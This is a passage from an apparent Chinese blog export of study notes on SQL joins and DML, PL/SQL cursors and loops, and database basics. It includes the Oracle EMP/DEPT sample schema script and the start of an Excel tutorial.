students;\n\n但是，假设我们希望结果集同时包含所在班级的名称，上面的结果集只有class_id列，缺少对应班级的name列。\n现在问题来了，存放班级名称的name列存储在classes表中，只有根据students表的class_id，找到classes表对应的行，再取出name列，就可以获得班级名称。\n这时，连接查询就派上了用场。我们先使用最常用的一种内连接——INNER JOIN来实现：\nselect s.id ,s.name,s.class_id,c.name classname,s.gender, s.score\nfrom students s\ninner join classes c\non s.class_id &#x3D; c.id;\n\n注意INNER JOIN查询的写法是：\n\n先确定主表，仍然使用FROM &lt;表1&gt;的语法；\n再确定需要连接的表，使用INNER JOIN &lt;表2&gt;的语法；\n然后确定连接条件，使用ON &lt;条件...&gt;，这里的条件是s.class_id = c.id，表示students表的class_id列与classes表的id列相同的行需要连接；\n可选：加上WHERE子句、ORDER BY等子句。\n\n使用别名不是必须的，但可以更好地简化查询语句。\n那什么是内连接（INNER JOIN）呢？先别着急，有内连接（INNER JOIN）就有外连接（OUTER JOIN）。我们把内连接查询改成外连接查询，看看效果：\nSELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score\nFROM students s\nRIGHT OUTER JOIN classes c\nON s.class_id &#x3D; c.id;\n\n\n\n执行上述RIGHT OUTER JOIN可以看到，和INNER JOIN相比，RIGHT OUTER JOIN多了一行，多出来的一行是“四班”，但是，学生相关的列如name、gender、score都为NULL。\n这也容易理解，因为根据ON条件s.class_id = c.id，classes表的id&#x3D;4的行正是“四班”，但是，students表中并不存在class_id&#x3D;4的行。\n有RIGHT OUTER JOIN，就有LEFT OUTER JOIN，以及FULL OUTER JOIN。它们的区别是：\nINNER JOIN只返回同时存在于两张表的行数据，由于students表的class_fdid包含1，2，3，classes表的id包含1，2，3，4，所以，INNER JOIN根据条件s.class_id = c.id返回的结果集仅包含1，2，3。\nRIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段。\nLEFT OUTER JOIN则返回左表都存在的行。如果我们给students表增加一行，并添加class_id&#x3D;5，由于classes表并不存在id&#x3D;5的行，所以，LEFT OUTER JOIN的结果会增加一行，对应的class_name是NULL：\nSELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score\nFROM students s\nLEFT OUTER JOIN classes c\nON s.class_id &#x3D; c.id;\n\n\n最后，我们使用FULL OUTER JOIN，它会把两张表的所有记录全部选择出来，并且，自动把对方不存在的列填充为NULL：\nSELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.score\nFROM students s\nFULL OUTER JOIN classes c\nON s.class_id &#x3D; c.id;\n\n\n对于这么多种JOIN查询，到底什么使用应该用哪种呢？其实我们用图来表示结果集就一目了然了。\n假设查询语句是：\nSELECT ... FROM tableA ??? JOIN tableB ON tableA.column1 &#x3D; tableB.column2;\n\n我们把tableA看作左表，把tableB看成右表，那么INNER JOIN是选出两张表都存在的记录：\n\nLEFT OUTER JOIN是选出左表存在的记录：\n\nRIGHT OUTER JOIN是选出右表存在的记录：\n\nFULL OUTER JOIN则是选出左右表都存在的记录：\n\n小结JOIN查询需要先确定主表，然后把另一个表的数据“附加”到结果集上；\nINNER JOIN是最常用的一种JOIN查询，它的语法是SELECT ... FROM &lt;表1&gt; INNER JOIN &lt;表2&gt; ON &lt;条件...&gt;；\nJOIN查询仍然可以使用WHERE条件和ORDER BY排序。\nINSERT\n当我们需要向数据库表中插入一条新记录时，就必须使用INSERT语句。\n\nINSERT语句的基本语法是：\nINSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...);\n\n例如，我们向students表插入一条新记录，先列举出需要插入的字段名称，然后在VALUES子句中依次写出对应字段的值：\nINSERT INTO students (class_id, name, gender, score) VALUES (2, &#39;大牛&#39;, &#39;M&#39;, 80);\n-- 查询并观察结果:\nSELECT * FROM students;\n\n注意到我们并没有列出id字段，也没有列出id字段对应的值，这是因为id字段是一个自增主键，它的值可以由数据库自己推算出来。此外，如果一个字段有默认值，那么在INSERT语句中也可以不出现。\n要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写INSERT INTO students (score, gender, name, class_id) ...，但是对应的VALUES就得变成(80, &#39;M&#39;, &#39;大牛&#39;, 2)。\n还可以一次性添加多条记录，只需要在VALUES子句中指定多个记录值，每个记录是由(...)包含的一组值：\nINSERT INTO students (class_id, name, gender, score) VALUES\n  (1, &#39;大宝&#39;, &#39;M&#39;, 87),\n  (2, &#39;二宝&#39;, &#39;M&#39;, 81);\n\nSELECT * FROM students;\n\n\n\n小结使用INSERT，我们就可以一次向一个表中插入一条或多条记录。\nUPDATE\n如果要更新数据库表中的记录，我们就必须使用UPDATE语句。\n\nUPDATE语句的基本语法是：\nUPDATE &lt;表名&gt; SET 字段1&#x3D;值1, 字段2&#x3D;值2, ... WHERE ...;\n\n例如，我们想更新students表id=1的记录的name和score这两个字段，先写出UPDATE students SET name=&#39;大牛&#39;, score=66，然后在WHERE子句中写出需要更新的行的筛选条件id=1：\nupdate students set name&#x3D;&#39;大牛&#39; ,score&#x3D;66\nwhere id&#x3D;4;\n\n\n\n注意到UPDATE语句的WHERE条件和SELECT语句的WHERE条件其实是一样的，因此完全可以一次更新多条记录：\nUPDATE students SET name&#x3D;&#39;小牛&#39;, score&#x3D;77 WHERE id&gt;&#x3D;5 AND id&lt;&#x3D;7;\n\n在UPDATE语句中，更新字段时可以使用表达式。例如，把所有80分以下的同学的成绩加10分：\nupdate students set score:&#x3D;score+10 \nwhere score&lt;80\n\n其中，SET score=score+10就是给当前行的score字段的值加上了10。\n如果WHERE条件没有匹配到任何记录，UPDATE语句不会报错，也不会有任何记录被更新。\n最后，要特别小心的是，UPDATE语句可以没有WHERE条件，例如：\nUPDATE students SET score&#x3D;60;\n\n这时，整个表的所有记录都会被更新。所以，在执行UPDATE语句时要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用UPDATE更新。\nMySQL在使用MySQL这类真正的关系数据库时，UPDATE语句会返回更新的行数以及WHERE条件匹配的行数。\n例如，更新id=1的记录时：\nmysql&gt; UPDATE students SET name&#x3D;&#39;大宝&#39; WHERE id&#x3D;1;\nQuery OK, 1 row affected (0.00 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nMySQL会返回1，可以从打印的结果Rows matched: 1 Changed: 1看到。\n当更新id=999的记录时：\nmysql&gt; UPDATE students SET name&#x3D;&#39;大宝&#39; WHERE id&#x3D;999;\nQuery OK, 0 rows affected (0.00 sec)\nRows matched: 0  Changed: 0  Warnings: 0\n\nMySQL会返回0，可以从打印的结果Rows matched: 0 Changed: 0看到。\n小结使用UPDATE，我们就可以一次更新表中的一条或多条记录。\nDELETE\n如果要删除数据库表中的记录，我们可以使用DELETE语句。\n\nDELETE语句的基本语法是：\nDELETE FROM &lt;表名&gt; WHERE ...;\n\n例如，我们想删除students表中id=1的记录，就需要这么写：\ndelete from students \nwhere id&#x3D;1;\n\n注意到DELETE语句的WHERE条件也是用来筛选需要删除的行，因此和UPDATE类似，DELETE语句也可以一次删除多条记录：\ndelete from studebts where id in(4,5,6)\n\n如果WHERE条件没有匹配到任何记录，DELETE语句不会报错，也不会有任何记录被删除。\n最后，要特别小心的是，和UPDATE类似，不带WHERE条件的DELETE语句会删除整个表的数据：\nDELETE FROM students;\n\n这时，整个表的所有记录都会被删除。所以，在执行DELETE语句时也要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用DELETE删除。\nMySQL在使用MySQL这类真正的关系数据库时，DELETE语句也会返回删除的行数以及WHERE条件匹配的行数。\n例如，分别执行删除id=1和id=999的记录：\nmysql&gt; DELETE FROM students WHERE id&#x3D;1;\nQuery OK, 1 row affected (0.01 sec)\n\nmysql&gt; DELETE FROM students WHERE id&#x3D;999;\nQuery OK, 0 rows affected (0.01 sec)\n\n小结使用DELETE，我们就可以一次删除表中的一条或多条记录。\nPL&#x2F;SQL程序设计附：代码中使用的数据库在文章尾给出\n什么是PL&#x2F;SQL?PL&#x2F;SQL是 Procedure Language &amp; Structured Query Language 的缩写。PL&#x2F;SQL是对SQL语言存储过程语言的扩展。\n指在SQL命令语言中增加了过程处理语句（如分支、循环等），使SQL语言具有过程处理能力。\n把SQL语言的数据操纵能力与过程语言的数据处理能力结合起来，使得PLSQL面向过程但比过程语言简单、高效、灵活和实用。\nPL&#x2F;SQL的优点或特征1 有利于客户&#x2F;服务器环境应用的运行\n2 适合于客户环境\n3 过程化\n4 模块化\n5 运行错误的可处理性\n6 提供大量内置程序包\nPL&#x2F;SQL 可用的SQL语句PL&#x2F;SQL是ORACLE系统的核心语言，现在ORACLE的许多部件都是由PL&#x2F;SQL写成。在PL&#x2F;SQL中可以使用的SQL语句有：INSERT，UPDATE，DELETE，SELECT INTO，COMMIT，ROLLBACK，SAVEPOINT。提示：在 PL&#x2F;SQL中只能用 SQL语句中的 DML 部分，不能用 DDL 部分，如果要在PL&#x2F;SQL中使用DDL(如CREATE table 等)的话，只能以动态的方式来使用。ORACLE 的 PL&#x2F;SQL 组件在对 PL&#x2F;SQL 程序进行解释时，同时对在其所使用的表名、列名及数据类型进行检查。PL&#x2F;SQL 可以在SQL*PLUS 中使用。PL&#x2F;SQL 可以在高级语言中使用。PL&#x2F;SQL可以在ORACLE的开发工具中使用(如：SQL Developer或Procedure Builder等)。其它开发工具也可以调用PL&#x2F;SQL编写的过程和函数，如Power Builder 等都可以调用服务器端的PL&#x2F;SQL过程。\nPL&#x2F;SQL程序结构及组成\n变量和常量说明\n第一个PL&#x2F;SQL程序set serveroutput on;  &#x2F;&#x2F;打開輸出\n\ndeclare \nbegin\nDBMS_OUTPUT.PUT_LINE(&#39;我的第一個pl&#x2F;sql程序&#39;);\nend;\n\n\n\n\n\n引用型变量eg:\n--引用型变量: 查询并打印empno為7521的ename和job\ndeclare\n--定义变量保存ename和job\n pename emp.ename%type;\n pjob emp.job%type;\n begin\n --查询\n    select ename,job into pename,pjob from emp\n    where empno&#x3D;7521;\n    DBMS_OUTPUT.PUT_LINE(pename||&#39;的job是&#39;||pjob);\n \n end;\n\n\n记录型变量-- 记录型变量：查询并打印empno為7521的ename和job\ndeclare\n    emp_rec emp%rowtype;\nbegin\n    select * into emp_rec from emp\n    where empno&#x3D;7521;\n    DBMS_OUTPUT.PUT_LINE(emp_rec.ename||&#39;的job是&#39;||emp_rec.job);\n\nend;\n\n\nif语句判断输入的是正数还是负数\n--接受键盘输入\n--变量num：是一个地址值，在该地址上保存了输入的值\naccept num PROMPT &#39;亲输入一个数字：&#39;;\ndeclare \n    pnumber number :&#x3D;&amp;num;\nbegin\n    if pnumber&#x3D;0 then\n        DBMS_OUTPUT.PUT_LINE(&#39;输入的是0&#39;);\n    ELSIF pnumber&gt;0 then\n        dbms_output.put_line(&#39;输入的是正数&#39;);\n    ELSE \n        dbms_output.put_line(&#39;输入的是负数&#39;);\n    end if;\nend;\n\n\n求两个数的和----如果要在屏幕上输出信息，需要将serveroutput开关打开\nset serveroutput on\n\n-- 例6：求两个数得和\n-- 接收键盘输入\naccept num1 prompt &#39;请输入第一个数&#39;\naccept num2 prompt &#39;请输入第二个数&#39;\ndeclare\n  --定义变量保存输入得数字\n  pnum1 number :&#x3D;&amp;num1;\n  pnum2 number :&#x3D;&amp;num2;\n  psum number :&#x3D;0;\nbegin\n  psum :&#x3D;pnum1+pnum2;\n  DBMS_OUTPUT.PUT_LINE(pnum1||&#39;+&#39;||pnum2||&#39;&#x3D;&#39;||psum);\nend;\n\n\n\n求1加到n的和使用while--求1加到n的和使用while\naccept n prompt&#39;请输入n&#39;;\ndeclare\n    n number :&#x3D;&amp;n;\n    i number :&#x3D;0;\n    ans number :&#x3D;0;\nbegin\n    while i&lt;n\n    loop\n    ans:&#x3D;ans+i;\n    i:&#x3D;i+1;\n    end loop;\n    dbms_output.put_line(ans);\nend;\n\n\n求1加到n的和使用do while--如果要在屏幕上输出信息，需要将serveroutput开关打开\nset serveroutput on\n-- 使用do while:求 1 加到 n 的和(循环)\n-- 接收键盘输入\naccept num prompt &#39;请输入一个数&#39;\ndeclare\n  --定义变量保存输入 的数字\n  pnum number :&#x3D; &amp;num;\n  pn number :&#x3D;1;\n  psum number :&#x3D;0;\nbegin\n  loop\n    exit when pn&gt;pnum;\n    psum :&#x3D;psum+pn;\n    pn :&#x3D;pn+1;\n  end loop;\n  -- 循环结束打印\n  dbms_output.put_line(&#39;1加到&#39;||pnum||&#39;的和为&#39;||psum);\nend;\n\n\n求1加到n的和使用for--如果要在屏幕上输出信息，需要将serveroutput开关打开\nset serveroutput on\n-- 使用for:求 1 加到 n 的和(循环)\n-- 接收键盘输入\naccept num prompt &#39;请输入一个数&#39;\ndeclare\n  --定义变量保存输入 的数字\n  pnum number :&#x3D; &amp;num;\n  psum number :&#x3D;0;\nbegin\n  for I in 1..pnum  --for循环的I直接使用，不用定义。1..100表示1到100的意思。不能有分号。\n  loop\n    psum :&#x3D;psum+I;\n  end loop;\n  -- 循环结束打印\n  dbms_output.put_line(&#39;1加到&#39;||pnum||&#39;的和为&#39;||psum);\nend;\n\n\n\n给SALESMAN涨10%的工资，给ANALYST涨5%的工资(游标)1、显式游标处理需四个PL&#x2F;SQL步骤：\n\n2、显式游标属性%FOUND 布尔值属性，当最近一次读记录时成功返回，则返回TURE\n%NOTFOUND 布尔值属性，与%FOUND相反\n%ISOPEN 布尔值属性，当游标已打开时返回TURE\n%ROWCOUNT 数字型属性，返回已从游标中读取的记录数\n-- 给SALESMAN涨10%的工资，给ANALYST涨5%的工资\ndeclare\n    pjob emp.job %TYPE;\n    psal emp.sal %type;\n    --\ncursor c1 is select emp.job,emp.sal from emp; --定义游标\nbegin\n    open c1;  --打开游标\n    fetch c1 into pjob,psal;  --取一个\n    while c1 % found \n    loop\n      if pjob&#x3D;&#39;SALESMAN&#39; then\n            psal:&#x3D;psal+psal*0.1;\n            dbms_output.put_line(psal);\n      ELSIF pjob&#x3D;&#39;ANALYST&#39;  then\n             psal:&#x3D;psal+psal*0.05;\n             dbms_output.put_line(psal);\n        else dbms_output.put_line(&#39;不需要改&#39;);\n        end if;\n        fetch c1 into pjob,psal;\n    end loop;\n    close c1;  --关闭光标\nend;\n\n\n\n\n3、游标的for循环\n 打印出 所有的员工的工资:salary: xxx（使用for循环）\n\ndeclare\n    psal emp.sal %TYPE;\n    cursor c1 is select emp.sal from emp;\nbegin\n    for i in c1 loop\n        dbms_output.put_line(i.sal);\n    end loop;\nend;\n\n\n\n\n使用游标打印员工的姓名和薪水--使用游标打印员工的姓名和薪水\ndeclare\n    psal emp.sal %TYPE;\n    pname emp.ename %type;\n    cursor c1 is select emp.ename,emp.sal from emp;\nbegin\n    open c1;\n    fetch c1 into pname, psal;\n    while c1 % found loop\n        dbms_output.put_line(pname||&#39;的工资是&#39;||psal);\n        fetch c1 into pname,psal;\n    end loop;\n     close c1;\nend;\n\n\n使用带参数的游标打印员工的姓名和薪水--如果要在屏幕上输出信息，需要将serveroutput开关打开\nset serveroutput on\n-- 带参数的游标  打印指定部门的员工的姓名和薪水\ndeclare\n    cursor c1( pno number) is select emp.ename,emp.sal from emp where deptno &#x3D; pno;\n    pname emp.ename %type;\n    psal emp.sal %type;\nbegin\n    open c1(10);\n    loop\n        FETCH c1 into pname,psal;\n        exit when c1 %notfound;\n        dbms_output.put_line(pname||&#39;的工资是&#39;||to_char(psal,&#39;L9,999.99&#39;));\n    end loop;\n    close c1;\nend;\n\n\n打印指定部门的员工信息--打印指定部门的员工信息\nset serveroutput on;\naccept ptnonum prompt &#39;请输入要查询的部门号：&#39;;\ndeclare \n    tnonum emp.deptno %type :&#x3D;&amp;ptnonum;\n    cursor c1(dnomun number) is select ename,sal,job,empno from emp where deptno&#x3D;dnomun;\n    pname emp.ename %TYPE;\n    psal emp.sal %type;\n    pjob emp.job %type;\n    pempno emp.empno %type;\nbegin\n    open c1(tnonum);\n    loop\n        FETCH c1 into pname,psal,pjob,pempno;\n        exit when c1 %notfound;\n        dbms_output.put_line(&#39;职位为&#39;||pjob ||&#39;的&#39;||pempno||pname||&#39;的工资为&#39;||psal);\n    end loop;\n\nend;\n\n\n系统例外的使用\n系统列外  演示系统列为被0除\n-- 系统列外  演示系统列为被0除\ndeclare\n    pnum number;\nbegin\n    pnum:&#x3D;2&#x2F;0;\n    EXCEPTION\n        when zero_divide then\n            dbms_output.put_line(&#39;0不能做分母&#39;);\n        when value_error then \n            dbms_output.put_line(&#39;算数或转换错误&#39;);\n        when others then\n            dbms_output.put_line(&#39;其他错误&#39;);\n\nend;\n\n\n用户自定义例外第一章 绪论考试范围：\n数据、数据库、数据库系统的定义与应用、数据库的体系结构、数据库用户与管理员、数据管理技术的发展\n基本要求：\n\n掌握数据、数据库、DBA、DBS等基本概念、数据库系统的体系结构。\n\n了解数据管理管理技术的发展、应用领域和发展方向。\n\n\n数据：是事物的符号表示，\n数据的含义是信息，数据是信息的载体，信息是数据的内涵。\n数据库：是长期存放在计算机内，有组织，可共享的数据集合。\n数据库管理系统（DBMS）：是数据库系统的核心组成部分，\n数据库系统（DBS）：是计算机系统中引入数据库后的系统组成，有数据库（DB），操作系统（OS），数据库管理系统（DBMS），应用开发工具，应用系统，用户，数据库管理员（DBA）。\n​                  \n数据管理管理技术的发展：人工管理阶段、文件系统阶段、数据库系统阶段\n数据库系统结构：外模式（用户级）、模式（概念级）、内模式（物理级）\n​        外模式：一个数据库可以有多个外模式，同一外模式可以为一个用户的多个应用系统所用，但一个应用系统只能有一个外模式，\n​        模式：一个数据库系统只能有一个模式\n二级映射：\n为了实现数据库三级层次的联系和转换，在三级模式之间提供了二级映射\n​        外模式&#x2F;模式映射\n​                模式描述的是数据的全局逻辑结构，外模式描述的是数据的局部逻辑结构，\n​        模式&#x2F;内模式映射\n\n附：--------------------------------------------------------\n--  File created -十二月-22-2020   \n--------------------------------------------------------\n--------------------------------------------------------\n--  DDL for Table BONUS\n--------------------------------------------------------\nCREATE TABLE &quot;BONUS&quot; (\n    &quot;ENAME&quot;   VARCHAR2(10),\n    &quot;JOB&quot;     VARCHAR2(9),\n    &quot;SAL&quot;     NUMBER,\n    &quot;COMM&quot;    NUMBER\n);\n--------------------------------------------------------\n--  DDL for Table DEPT\n--------------------------------------------------------\n\nCREATE TABLE &quot;DEPT&quot; (\n    &quot;DEPTNO&quot;   NUMBER(2, 0),\n    &quot;DNAME&quot;    VARCHAR2(14),\n    &quot;LOC&quot;      VARCHAR2(13)\n);\n--------------------------------------------------------\n--  DDL for Table EMP\n--------------------------------------------------------\n\nCREATE TABLE &quot;EMP&quot; (\n    &quot;EMPNO&quot;      NUMBER(4, 0),\n    &quot;ENAME&quot;      VARCHAR2(10),\n    &quot;JOB&quot;        VARCHAR2(9),\n    &quot;MGR&quot;        NUMBER(4, 0),\n    &quot;HIREDATE&quot;   DATE, \n\t&quot;SAL&quot;        NUMBER(7, 2),\n    &quot;COMM&quot;       NUMBER(7, 2),\n    &quot;DEPTNO&quot;     NUMBER(2, 0)\n);\n--------------------------------------------------------\n--  DDL for Table SALGRADE\n--------------------------------------------------------\n\nCREATE TABLE &quot;SALGRADE&quot; (\n    &quot;GRADE&quot;   NUMBER,\n    &quot;LOSAL&quot;   NUMBER,\n    &quot;HISAL&quot;   NUMBER\n);\n\n---------------------------------------------------\n--   DATA FOR TABLE BONUS\n--   FILTER &#x3D; none used\n---------------------------------------------------\nREM INSERTING into BONUS\n\n---------------------------------------------------\n--   END DATA FOR TABLE BONUS\n---------------------------------------------------\n\n---------------------------------------------------\n--   DATA FOR TABLE DEPT\n--   FILTER &#x3D; none used\n---------------------------------------------------\nREM INSERTING into DEPT\n\nINSERT INTO dept (\n    deptno,\n    dname,\n    loc\n) VALUES (\n    10,\n    &#39;ACCOUNTING&#39;,\n    &#39;NEW YORK&#39;\n);\n\nINSERT INTO dept (\n    deptno,\n    dname,\n    loc\n) VALUES (20,\n    &#39;RESEARCH&#39;,\n    &#39;DALLAS&#39;\n);\n\nINSERT INTO dept (\n    deptno,\n    dname,\n    loc\n) VALUES (\n    30,\n    &#39;SALES&#39;,\n    &#39;CHICAGO&#39;\n);\n\nINSERT INTO dept (\n    deptno,\n    dname,\n    loc\n) VALUES (\n    40,\n    &#39;OPERATIONS&#39;,\n    &#39;BOSTON&#39;\n);\n\n---------------------------------------------------\n--   END DATA FOR TABLE DEPT\n---------------------------------------------------\n\n---------------------------------------------------\n--   DATA FOR TABLE EMP\n--   FILTER &#x3D; none used\n---------------------------------------------------\nREM INSERTING into EMP\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (7369,\n    &#39;SMITH&#39;,\n    &#39;CLERK&#39;,\n    7902,\n    to_timestamp(&#39;17-12月-80 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    800,\n    NULL,\n    20\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7499,\n    &#39;ALLEN&#39;,\n    &#39;SALESMAN&#39;,\n    7698,\n    to_timestamp(&#39;20-2月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    1600,\n    300,\n    30\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7521,\n    &#39;WARD&#39;,\n    &#39;SALESMAN&#39;,\n    7698,\n    to_timestamp(&#39;22-2月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    1250,\n    500,\n    30\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7566,\n    &#39;JONES&#39;,\n    &#39;MANAGER&#39;,\n    7839,\n    to_timestamp(&#39;02-4月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    2975,\n    NULL,\n    20\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7654,\n    &#39;MARTIN&#39;,\n    &#39;SALESMAN&#39;,\n    7698,\n    to_timestamp(&#39;28-9月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    1250,\n    1400,\n    30\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7698,\n    &#39;BLAKE&#39;,\n    &#39;MANAGER&#39;,\n    7839,\n    to_timestamp(&#39;01-5月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    2850,\n    NULL,\n    30\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7782,\n    &#39;CLARK&#39;,\n    &#39;MANAGER&#39;,\n    7839,\n    to_timestamp(&#39;09-6月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    2450,\n    NULL,\n    10\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7788,\n    &#39;SCOTT&#39;,\n    &#39;ANALYST&#39;,\n    7566,\n    to_timestamp(&#39;19-4月 -87 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    3000,\n    NULL,\n    20\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7839,\n    &#39;KING&#39;,\n    &#39;PRESIDENT&#39;,\n    NULL,\n    to_timestamp(&#39;17-11月-81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    5000,\n    NULL,\n    10\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7844,\n    &#39;TURNER&#39;,\n    &#39;SALESMAN&#39;,\n    7698,\n    to_timestamp(&#39;08-9月 -81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    1500,\n    0,\n    30\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7876,\n    &#39;ADAMS&#39;,\n    &#39;CLERK&#39;,\n    7788,\n    to_timestamp(&#39;23-5月 -87 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    1100,\n    NULL,\n    20\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7900,\n    &#39;JAMES&#39;,\n    &#39;CLERK&#39;,\n    7698,\n    to_timestamp(&#39;03-12月-81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    950,\n    NULL,\n    30\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7902,\n    &#39;FORD&#39;,\n    &#39;ANALYST&#39;,\n    7566,\n    to_timestamp(&#39;03-12月-81 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    3000,\n    NULL,\n    20\n);\n\nINSERT INTO emp (\n    empno,\n    ename,\n    job,\n    mgr,\n    hiredate,\n    sal,\n    comm,\n    deptno\n) VALUES (\n    7934,\n    &#39;MILLER&#39;,\n    &#39;CLERK&#39;,\n    7782,\n    to_timestamp(&#39;23-1月 -82 12.00.00.000000000 上午&#39;, &#39;DD-MON-RR HH.MI.SS.FF AM&#39;),\n    1300,\n    NULL,\n    10\n);\n\n---------------------------------------------------\n--   END DATA FOR TABLE EMP\n---------------------------------------------------\n\n---------------------------------------------------\n--   DATA FOR TABLE SALGRADE\n--   FILTER &#x3D; none used\n---------------------------------------------------\nREM INSERTING into SALGRADE\n\nINSERT INTO salgrade (\n    grade,\n    losal,\n    hisal\n) VALUES (\n    1,\n    700,\n    1200\n);\n\nINSERT INTO salgrade (\n    grade,\n    losal,\n    hisal\n) VALUES (\n    2,\n    1201,\n    1400\n);\n\nINSERT INTO salgrade (\n    grade,\n    losal,\n    hisal\n) VALUES (\n    3,\n    1401,\n    2000\n);\n\nINSERT INTO salgrade (\n    grade,\n    losal,\n    hisal\n) VALUES (\n    4,\n    2001,\n    3000\n);\n\nINSERT INTO salgrade (\n    grade,\n    losal,\n    hisal\n) VALUES (\n    5,\n    3001,\n    9999\n);\n\n---------------------------------------------------\n--   END DATA FOR TABLE SALGRADE\n---------------------------------------------------\n\n--------------------------------------------------------\n--  Constraints for Table EMP\n--------------------------------------------------------\n\nALTER TABLE &quot;EMP&quot; ADD CONSTRAINT &quot;PK_EMP&quot; PRIMARY KEY ( &quot;EMPNO&quot; ) ENABLE;\n\n--------------------------------------------------------\n--  Constraints for Table DEPT\n--------------------------------------------------------\n\nALTER TABLE &quot;DEPT&quot; ADD CONSTRAINT &quot;PK_DEPT&quot; PRIMARY KEY ( &quot;DEPTNO&quot; ) ENABLE;\n--------------------------------------------------------\n\n--------------------------------------------------------\n--  Ref Constraints for Table EMP\n--------------------------------------------------------\n\nALTER TABLE &quot;EMP&quot;\n    ADD CONSTRAINT &quot;FK_DEPTNO&quot; FOREIGN KEY ( &quot;DEPTNO&quot; )\n        REFERENCES &quot;DEPT&quot; ( &quot;DEPTNO&quot; )\n    ENABLE;\n\n\n-----------------------\n\nSELECT\n    ename\nFROM\n    emp;\n\n参考：廖雪峰的官方网站\nJepson6669\nPL&#x2F;SQL程序设计（四）—— 游标\n","slug":"Oracle数据库学习","date":"2020-11-27T00:36:00.000Z","categories_index":"学习笔记","tags_index":"SQL,Oracle","author_index":"kif"},{"id":"8faec51e1f6b3c25bf08065c25431af4","title":"Excel数据整理与分析","content":"Excel数据整理与分析\n\n\n应用层工作流程知识点部分需要掌握以下基本知识点:Excel的基本工作流程及工作簿、工作表、行与列、鼠标状态、单元格的相关参数。为后面章节打牢基础!\n基本工作流程数据的存储—-》 数据的处理———》数据的分析———》数据的呈现\n名词解析\nenter image description here\n工作簿即一个Excel文件；\n工作表分为当前活动工作表和非活动工作表；\n如Sheet1 是当前活动工作表；其他的是非活动工作表\n\nAlt text\n一个工作簿可容纳255个工作表；\n行与列CTRL+Down 可下滑至最后一行，即1048576行；\nCTRL+Right 可右滑至最右列，文件-选项-公式-R1C1引用样式勾选-确定，可看到有16384列；\n单元格每个单元格可村32767个字符\n选项卡\nenter image description here\n选项-自定义功能区 可以更改\n编辑栏选项卡-视图可选择显示与否编辑栏\n名称框\nenter image description here\n可对一个区域命名；\n鼠标三大状态\n选挥柄：\n用于选择单元格区域\n移动柄：用于移动或配合ctrH键盘复制单元格区域\n填充柄：复制、填充单元格区域，包括数据、公式等，双击有惊喜!\n实例：一.快速添加序号1.序号栏输入1 2；\n\nenter image description here\n2.选中1 2这两框，鼠标移到右下角。向下拖动\n\nAlt text\n二.快速复制属性\n\n单元格\n回顾笔记整理1、Excel的基本 